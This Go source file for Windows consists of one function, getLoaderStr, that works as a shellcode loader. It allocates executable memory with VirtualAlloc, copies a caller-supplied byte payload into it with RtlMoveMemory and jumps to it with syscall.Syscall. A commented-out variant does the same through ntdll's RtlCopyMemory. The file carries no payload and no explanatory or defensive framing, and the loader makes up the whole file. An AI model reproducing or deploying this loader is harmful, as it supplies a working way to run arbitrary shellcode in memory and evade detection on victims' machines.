package main

import (
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

//const (
//	MEM_COMMIT              = 0x1000
//	MEM_RESERVE             = 0x2000
//	PAGE_EXECUTE_READWWRITE = 0x40
//)

func getLoaderStr(payload []byte) error {
	//var (
	//	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	//	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	//	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	//	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	//)
	//add, _, err := VirtualAlloc.Call(0, uintptr(len(payload)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWWRITE)
	//if add == 0 {
	//	return err
	//}
	//_, _, err2 := RtlCopyMemory.Call(add, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)))
	//if err2 != nil {
	//	return err
	//}
	//syscall.Syscall(add, 0, 0, 0, 0)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)))
	syscall.Syscall(addr, 0, 0, 0, 0)
	return nil
}
